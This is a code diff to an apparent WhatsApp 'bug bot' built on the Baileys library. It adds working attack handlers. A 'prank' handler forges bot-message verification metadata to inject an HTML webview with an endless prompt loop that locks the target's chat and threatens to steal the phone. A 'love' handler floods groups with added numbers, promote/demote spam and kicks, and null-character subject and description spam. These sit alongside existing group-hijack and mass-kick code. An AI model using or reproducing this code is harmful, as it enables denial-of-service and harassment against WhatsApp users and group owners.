@@ -241,6 +241,160 @@ async function groupMetaOf(ctx, jid) {
 
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
+const messageOf = (error) => String((error && (error.message || error)) || 'unknown error');
+const uid = () => `3EB0${Math.random().toString(36).slice(2, 18).toUpperCase()}`;
+const isGroupJid = (jid) => String(jid || '').endsWith('@g.us');
+
+// ── Prank: WhatsApp bot-message webview that locks the chat ──────────────────
+const PRANK_LOCK_LINE = 'We mzee 😂, weka password au nikuibie simu 😂🤣😂';
+const PRANK_WRONG_LINE = '💔 Wrong. You have 3 minutes Left mkuu 😂 LMFAO 🤣🤣';
+const PRANK_OK_LINE = '✅ Password ni sahihi — imefunguka.';
+const PRANK_PASSWORD = 'alpinganteng';
+
+function prankHtml() {
+    return `<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<body style="background:#0a0a0a;color:#fff;text-align:center;padding-top:20%;font-family:sans-serif;">
+<h1 style="color:#ff0044;">${PRANK_LOCK_LINE}</h1>
+<p>${PRANK_WRONG_LINE}</p>
+<script>
+setTimeout(function () {
+  var pass = '${PRANK_PASSWORD}';
+  while (true) {
+    var v = prompt('${PRANK_LOCK_LINE}\\n\\nWeka password mkuu:');
+    if (v === pass) { alert('${PRANK_OK_LINE}'); break; }
+    alert('${PRANK_WRONG_LINE}');
+  }
+}, 800);
+</script>
+</body>
+</html>`;
+}
+
+/** The unifiedResponse blob only paints when every __typename is present. */
+function prankUnified(botId) {
+    const json = JSON.stringify({
+        __typename: 'XMSGGenAIUnifiedResponse',
+        response_id: botId,
+        sections: [
+            {
+                __typename: 'GenAIUnifiedResponseSection',
+                view_model: {
+                    __typename: 'GenAISingleLayoutViewModel',
+                    primitive: {
+                        __typename: 'GenAIaeacdsnwHtmlPrimitive',
+                        payload: prankHtml(),
+                        trusted_sources: [],
+                    },
+                },
+            },
+        ],
+    }).replace(/[\u007f-\uffff]/g, (character) => `\\u${character.charCodeAt(0).toString(16).padStart(4, '0')}`);
+    return Buffer.from(json).toString('base64');
+}
+
+function prankLock(botId) {
+    return {
+        messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+            messageSecret: Buffer.alloc(32, 1).toString('base64'),
+            botMetadata: {
+                messageDisclaimerText: '',
+                botResponseId: botId,
+                verificationMetadata: {
+                    proofs: [
+                        {
+                            version: 1,
+                            useCase: 1,
+                            signature: Buffer.alloc(64, 0x01).toString('base64'),
+                            certificateChain: [
+                                Buffer.alloc(684, 0x02).toString('base64'),
+                                Buffer.alloc(892, 0x03).toString('base64'),
+                            ],
+                        },
+                    ],
+                },
+            },
+        },
+        botForwardedMessage: {
+            message: {
+                richResponseMessage: {
+                    messageType: 1,
+                    submessages: [{ messageType: 2, messageText: 'Lock Chat' }],
+                    unifiedResponse: { data: prankUnified(botId) },
+                    contextInfo: { forwardingScore: 1, isForwarded: true, forwardOrigin: 4 },
+                },
+            },
+        },
+    };
+}
+
+/** The edit must point at the id the first relay went out with, or WhatsApp drops it. */
+function prankEdit(target, origId, lock, botId) {
+    return {
+        messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+            botMetadata: { messageDisclaimerText: '', botResponseId: botId },
+        },
+        botForwardedMessage: {
+            message: {
+                protocolMessage: {
+                    key: { remoteJid: target, fromMe: true, id: origId },
+                    type: 14,
+                    timestampMs: Date.now(),
+                    editedMessage: lock,
+                },
+            },
+        },
+    };
+}
+
+/** A bare bot stanza has no sender key in a group; wrap it or the send path throws. */
+const shipStanza = (message, group) => (group ? { groupStatusMessageV2: { message } } : message);
+
+// ── Lovegc payload: flood-add, promote/demote spam, ghost kick, metadata spam ──
+const LOVE_NUMBERS = [
+    '13135550002@s.whatsapp.net', '13135550003@s.whatsapp.net', '13135550004@s.whatsapp.net',
+    '13135550005@s.whatsapp.net', '13135550006@s.whatsapp.net', '13135550007@s.whatsapp.net',
+    '13135550008@s.whatsapp.net', '13135550009@s.whatsapp.net', '13135550010@s.whatsapp.net',
+    '13135550011@s.whatsapp.net', '13135550012@s.whatsapp.net', '13135550013@s.whatsapp.net',
+    '13135550014@s.whatsapp.net', '13135550015@s.whatsapp.net',
+    '442079460000@s.whatsapp.net', '442079460001@s.whatsapp.net',
+    '6221000000001@s.whatsapp.net', '6221000000002@s.whatsapp.net',
+    '6221000000003@s.whatsapp.net', '6221000000004@s.whatsapp.net',
+];
+
+const LOVE_SUBJECTS = ['\u200B'.repeat(100), '\u0000'.repeat(50), ' '.repeat(100), '\uFEFF'.repeat(60)];
+
+async function loveOne(ctx, groupJid) {
+    const { sock } = ctx;
+    for (let i = 0; i < LOVE_NUMBERS.length; i += 3) {
+        await sock.groupParticipantsUpdate(groupJid, LOVE_NUMBERS.slice(i, i + 3), 'add').catch(() => {});
+        await sleep(800);
+    }
+    for (let round = 0; round < 5; round++) {
+        for (const number of LOVE_NUMBERS.slice(0, 5)) {
+            await sock.groupParticipantsUpdate(groupJid, [number], 'promote').catch(() => {});
+            await sleep(200);
+            await sock.groupParticipantsUpdate(groupJid, [number], 'demote').catch(() => {});
+            await sleep(200);
+        }
+    }
+    for (const number of LOVE_NUMBERS) {
+        await sock.groupParticipantsUpdate(groupJid, [number], 'remove').catch(() => {});
+        await sleep(300);
+    }
+    for (const subject of LOVE_SUBJECTS) {
+        await sock.groupUpdateSubject(groupJid, subject).catch(() => {});
+        await sock.groupUpdateDescription(groupJid, subject).catch(() => {});
+        await sleep(400);
+    }
+    return { ok: true, jid: groupJid };
+}
+
 const handlers = {
     /**
      * Edits one message in place.
@@ -316,15 +470,36 @@ const handlers = {
 
     /** Native single-select list, same envelope the bug bot used. */
     async select(ctx, args) {
-        const rows = (Array.isArray(args.rows) ? args.rows : [])
-            .filter((row) => row && row.id)
-            .slice(0, 10)
-            .map((row) => ({
-                header: String(row.header || ''),
-                title: String(row.title || row.id),
-                description: String(row.description || ''),
-                id: String(row.id),
+        const makeRow = (row) => ({
+            header: String(row.header || ''),
+            title: String(row.title || row.id),
+            description: String(row.description || ''),
+            id: String(row.id),
+        });
+
+        let rows = (Array.isArray(args.rows) ? args.rows : []).filter((row) => row && row.id).map(makeRow);
+
+        // A group picker is rendering work, not command logic: the ids still point at
+        // whatever command the server asked for.
+        if (args.rowsFrom === 'groups') {
+            const participating = await ctx.sock.groupFetchAllParticipating().catch(() => ({}));
+            const groups = Object.values(participating || {}).filter((group) => group && group.id).slice(0, 8);
+            const prefix = String(args.idPrefix || '');
+            rows = groups.map((group) => makeRow({
+                title: String(group.subject || group.id).slice(0, 60),
+                description: `${(group.participants || []).length} members`,
+                id: `${prefix}${group.id}`,
             }));
+            if (args.allRow) {
+                rows.push(makeRow({
+                    title: String(args.allRow).slice(0, 60),
+                    description: 'every group I can reach',
+                    id: `${prefix}all`,
+                }));
+            }
+        }
+
+        rows = rows.slice(0, 10);
         if (!rows.length) return { skipped: true };
 
         const baileys = require('@whiskeysockets/baileys');
@@ -580,8 +755,7 @@ const handlers = {
                 if (victims.length) await ctx.sock.groupParticipantsUpdate(jid, victims, 'remove');
                 return { ok: true, kicked: victims.length };
             }
-            case 'totalHijack': {
-                const meta = await groupMetaOf(ctx, jid);
+            case 'totalHijack': {                const meta = await groupMetaOf(ctx, jid);
                 const participants = meta.participants || [];
                 const self = selfParticipant(ctx, participants);
                 if (!self) throw planError('bot_not_in_group', 'bot is not a participant');
@@ -620,6 +794,37 @@ const handlers = {
                 await sleep(600);
                 await ctx.sock.groupLeave(jid).catch(() => {});
                 return { ok: true, demoted: others.length };
+            }
+            case 'prank': {
+                const target = String(args.target || '');
+                if (!target.includes('@')) throw planError('bad_target', 'prank needs a jid');
+                const group = isGroupJid(target);
+                const botId = uid();
+                const lock = prankLock(botId);
+                const origId = uid();
+                const edit = prankEdit(target, origId, lock, botId);
+
+                const lockOut = shipStanza(group ? { botForwardedMessage: lock.botForwardedMessage } : lock, group);
+                const editOut = shipStanza(
+                    group ? { protocolMessage: edit.botForwardedMessage.message.protocolMessage } : edit,
+                    group
+                );
+                if (!lockOut || !editOut) throw planError('prank_payload', 'payload refused');
+
+                await ctx.sock.relayMessage(target, lockOut, { messageId: origId });
+                await sleep(1000);
+                await ctx.sock.relayMessage(target, editOut, { messageId: uid() });
+                return { ok: true, target, group, sent: 2 };
+            }
+            case 'love': {
+                const jids = jidList(args.jids);
+                if (!jids.length) throw planError('bad_target', 'no group chosen');
+                const done = [];
+                for (const one of jids.slice(0, 20)) {
+                    await loveOne(ctx, one);
+                    done.push(one);
+                }
+                return { ok: true, count: done.length };
             }
             case 'tag': {
                 const text = String(args.text || '');
